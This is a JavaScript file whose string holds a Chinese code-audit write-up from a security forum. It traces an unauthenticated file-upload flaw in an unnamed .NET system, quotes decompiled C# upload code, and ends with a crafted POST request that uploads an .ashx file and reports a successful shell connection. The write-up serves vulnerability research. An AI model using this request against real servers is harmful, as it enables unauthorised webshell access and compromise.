const e=`# \u6587\u7AE0 - \u67D0\u7CFB\u7EDF\u4EE3\u7801\u5BA1\u8BA1\u5230getshell  - \u5148\u77E5\u793E\u533A

Created: March 26, 2025 11:39 AM
URL: https://xz.aliyun.com/news/16278
\u6587\u7AE0\u4E8C\u7EA7\u7C7B\u522B: 0Day\u6316\u6398-\u6CE8\u610F\u56FE\u7247\u624B\u52A8\u62D6\u8FDB\u6765
\u6587\u7AE0\u7C7B\u522B(\u6839\u636EWebStorm\u7684\u76EE\u5F55\u6765): \u4EE3\u7801\u5BA1\u8BA1

\u8BE5\u7CFB\u7EDF\u5206\u4E3A\u524D\u7AEF\u8DEF\u7531\u548C\u540E\u7AEF\u8DEF\u7531
\u9996\u5148\u770B\u5230\u9274\u6743\u767D\u540D\u5355\uFF0C/file/UploadFile\u5B58\u5728

\u770B\u540E\u7AEF\u903B\u8F91

![](https://xzfile.aliyuncs.com/media/upload/picture/20241220153453-e6f908f4-bea4-1.png)

\u8FD9\u91CC\u53EF\u4EE5\u770B\u5230\u5224\u65ADIsFileStorageBack\u7684\u503C\uFF0C\u901A\u8FC7web.config\u770B

![](https://xzfile.aliyuncs.com/media/upload/picture/20241220153600-0f5c3e10-bea5-1.png)

\u53EF\u4EE5\u770B\u5230\u4E3A0\uFF0C\u90A3\u4E48\u5C31\u8DF3\u8FC7if\u8BED\u53E5\uFF0C\u8D70\u65B0\u7248\u672C\u6587\u4EF6\u4E0A\u4F20\uFF0C\u90A3\u4E48\u8FDB\u5165CreateFileStorageServ().UploadFile();
\u9996\u5148\u770B\u770B\u6574\u4F53\u662F\u5426\u8FC7\u6EE4\uFF0C\u8FDB\u5165CreateFileStorageServ\u65B9\u6CD5

![](https://xzfile.aliyuncs.com/media/upload/picture/20241220153641-27ca42da-bea5-1.png)

![](https://xzfile.aliyuncs.com/media/upload/picture/20241220153721-3f336924-bea5-1.png)

![](https://xzfile.aliyuncs.com/media/upload/picture/20241220153727-4331ce12-bea5-1.png)

\u4F46\u662F\u8FD9\u91CCSaveData\u8DDF\u4E0D\u8FDB\u53BB\uFF0C\u90A3\u4E48\u5728\u522B\u7684dll\u4E2D\uFF0C\u641C\u7D22

![](https://xzfile.aliyuncs.com/media/upload/picture/20241220153733-46831e90-bea5-1.png)

3\u4E2Adll\u4E2D\u90FD\u6709
\u5148\u6253\u5F00
Form.Service.dll\u641C\u7D22StorageFactory\uFF0C

![](https://xzfile.aliyuncs.com/media/upload/picture/20241220153859-7997aa12-bea5-1.png)

\u8DF3\u5165CreateStorage
\u53EF\u4EE5\u770B\u5230storagetype\u4E0D\u4F20\u5165\u65F6\u5019\u9ED8\u8BA4\u8BBE\u7F6E\u4E3A0\uFF0C\u90A3\u4E48\u8FDB\u5165"0" => new LocalStorage(),
\u8FD9\u91CC\u8FDB\u884C\u4E86\u6587\u4EF6\u4E0A\u4F20\uFF0C\u4F20\u5165\u7684\u53C2\u6570basepath\uFF0Cvguid\uFF0Cfilename\uFF0Cbasepath\u548Cvguid\u901A\u8FC7Combine\u65B9\u6CD5\u8FDB\u884C\u62FC\u63A5\u4E3A\u8DEF\u5F84
\u65B9\u6CD5\u5982\u4E0B\uFF1A

![](https://xzfile.aliyuncs.com/media/upload/picture/20241220153933-8e2c8128-bea5-1.png)

![](https://xzfile.aliyuncs.com/media/upload/picture/20241220154025-ad0adc70-bea5-1.png)

![](https://xzfile.aliyuncs.com/media/upload/picture/20241220154046-b9dace42-bea5-1.png)

CheckInvalidPathChars\u5BF9\u5176\u4E2D\u8DEF\u5F84\u8FDB\u884C\u4E86\u68C0\u6D4B

![](https://xzfile.aliyuncs.com/media/upload/picture/20241220154109-c725419a-bea5-1.png)

\u7136\u540E\u8FDB\u5165StorageHelper.MergePath\u62FC\u63A5

![](https://xzfile.aliyuncs.com/media/upload/picture/20241220154129-d36ccf04-bea5-1.png)

\u63A5\u4E0B\u6765\u5C31\u662F

![](https://xzfile.aliyuncs.com/media/upload/picture/20241220154151-e031c898-bea5-1.png)

using (FileStream fileStream = new FileStream(text, FileMode.OpenOrCreate, FileAccess.Write))
{
inputStream.CopyTo(fileStream);
num = fileStream.Length;
fileStream.Close();
}

\u5199\u6587\u4EF6\u64CD\u4F5C

\u90A3\u4E48\u6574\u4F53\u770B\u4E0B\u6765\uFF0Ccontext\u5E76\u6CA1\u6709\u505A\u8FC7\u6EE4

![](https://xzfile.aliyuncs.com/media/upload/picture/20241220154252-04c6fd40-bea6-1.png)

\u83B7\u5F97\u6587\u4EF6\u540D\u8FD9\u91CC\u4E5F\u6CA1\u6709\u505A\u8FC7\u6EE4
\u90A3\u4E48\u6574\u4F53\u770B\u4E0B\u6765SaveData\u65B9\u6CD5\u4E2D\u6CA1\u6709\u505A\u8FC7\u6EE4\uFF0C\u90A3\u4E48\u56DE\u5230

![](https://xzfile.aliyuncs.com/media/upload/picture/20241220154309-0efdd64e-bea6-1.png)

\u4E3B\u65B9\u6CD5\uFF0C\u53D1\u73B0\u5728SaveData\u65B9\u6CD5\u4E4B\u524DStorageExtNameFilter_Calling\uFF0C

![](https://xzfile.aliyuncs.com/media/upload/picture/20241220154358-2c42eb36-bea6-1.png)

\u8DDF\u636E\u5173\u952E\u8BCD\u5B9A\u4F4D\u53D1\u73B0\u8FD9\u91CC\u7684\u95EE\u9898

![](https://xzfile.aliyuncs.com/media/upload/picture/20241220154440-44e9e8f6-bea6-1.png)

\u53EF\u4EE5\u770B\u5230\u5BF9\u90E8\u5206\u6587\u4EF6\u6269\u5C55\u540D\u8FDB\u884C\u4E86\u8FC7\u6EE4\uFF0C\u4F46\u662F\u4ED6\u6CA1\u8FC7\u6EE4ashx\u540E\u7F00
\u5176\u4ED6\u7684\u5982\u4E0B
\u8DDF\u8FDB\u53BB\u770B\u8FD9\u4E9B\u5E76\u4E0D\u9020\u6210\u5F71\u54CD\uFF0C\u90A3\u4E48\u5C31\u53EF\u4EE5\u4E0A\u4F20\u4E86\uFF0C\u4E0A\u4F20\u8BF7\u6C42\u5305\u5982\u4F55\u6784\u9020\u5462\uFF0C\u56DE\u5230\u6700\u5F00\u59CB\u7684\u5730\u65B9

![](https://xzfile.aliyuncs.com/media/upload/picture/20241220154507-5543340a-bea6-1.png)

![](https://xzfile.aliyuncs.com/media/upload/picture/20241220154522-5dd71b40-bea6-1.png)

![](https://xzfile.aliyuncs.com/media/upload/picture/20241220154608-79c4502a-bea6-1.png)

protected JObject CloneRequestToJson(out Stream inputStream)
{
HttpRequestBase baseRequest = GetBaseRequest();
JObject jObject = new JObject();
string[] allKeys = baseRequest.Form.AllKeys;
foreach (string text in allKeys)
{
string defaultValue = baseRequest.Form[text];
jObject.SetDefultValue(text.ToLower(), defaultValue);
}
allKeys = baseRequest.QueryString.AllKeys;
foreach (string text2 in allKeys)
{
string defaultValue2 = baseRequest.QueryString[text2];
jObject.SetDefultValue(text2.ToLower(), defaultValue2);
}
string text3 = "";
text3 = baseRequest.Url.PathAndQuery;
jObject["pathandquery"] = (JToken)text3;
string text4 = baseRequest.Headers.Get("storagetype");
if (!string.IsNullOrWhiteSpace(text4))
{
jObject.SetDefultValue("storagetype", text4);
}
string text5 = baseRequest.Headers.Get("contentHeaders");
if (!string.IsNullOrWhiteSpace(text5))
{
byte[] bytes = Convert.FromBase64String(text5);
text5 = Encoding.UTF8.GetString(bytes);
JObject jObject2 = JObject.Parse(text5);
jObject.MergeInto(jObject2);
jObject.MergeInto<JObject>("contentHeaders", jObject2);
}
bool flag = jObject.GetResult("storagetype", "").ToString() != "2";
inputStream = null;
if (baseRequest.Files != null && baseRequest.Files.Count > 0)
{
for (int j = 0; j < 1; j++)
{
HttpPostedFileBase httpPostedFileBase = baseRequest.Files[j];
jObject["filename"] = (JToken)httpPostedFileBase.FileName;
jObject["filelength"] = (JToken)(long)httpPostedFileBase.ContentLength;
jObject["filecontenttype"] = (JToken)httpPostedFileBase.ContentType;
inputStream = (flag ? httpPostedFileBase.InputStream : baseRequest.InputStream);
if (!flag)
{
byte[] array = new byte[httpPostedFileBase.InputStream.Length];
httpPostedFileBase.InputStream.Read(array, 0, array.Length);
jObject["filebuf"] = (JToken)array;
httpPostedFileBase.InputStream.Seek(0L, SeekOrigin.Begin);
}
}
}
else
{
inputStream = baseRequest.InputStream;
}
jObject.SetDefultValue("contenttype", baseRequest.ContentType);
jObject.SetDefultValue("httpmethod", baseRequest.HttpMethod);
jObject.SetDefultValue("vorgid", "0");
return jObject;
}

\u53EF\u4EE5\u770B\u5230\u5934\u6587\u4EF6storagetype\u4F20\u51650\u65F6\u5019\u8FDB\u5165LocalStorage(),contentHeaders\u6CA1\u6709\u8981\u6C42\u586B\u7A7A\u5C31\u884C\uFF0C

\u90A3\u4E48\u8FD9\u91CCflag\u662Ftrue\uFF0CinputStream = (flag ? httpPostedFileBase.InputStream : baseRequest.InputStream);\u8D70\u7684\u662FhttpPostedFileBase.InputStream\uFF0C
\u90A3\u4E48\u6784\u9020\u4E0A\u4F20\u8BF7\u6C42\u5305

![](https://xzfile.aliyuncs.com/media/upload/picture/20241220154746-b408047a-bea6-1.png)

POST /File/UploadFile?a=1 HTTP/1.1
Host: x.x.x.x
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 SE 2.X MetaSr 1.0
DNT: 1
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQIimhXw3aj8cZ3xg
Content-Length: 379
------WebKitFormBoundaryQIimhXw3aj8cZ3xg
Content-Disposition: form-data; name="basepath"
------WebKitFormBoundaryQIimhXw3aj8cZ3xg
Content-Disposition: form-data; name="vguid"
xxxxxxxxx
------WebKitFormBoundaryQIimhXw3aj8cZ3xg
Content-Disposition: form-data; name="file"; filename="123.ashx"
xxxxxx
------WebKitFormBoundaryQIimhXw3aj8cZ3xg--

![](https://xzfile.aliyuncs.com/media/upload/picture/20241220155156-48f3024c-bea7-1.png)

\u6210\u529F\u8FDE\u63A5

![](https://xzfile.aliyuncs.com/media/upload/picture/20241220155232-5ea54488-bea7-1.png)`;export{e as _};
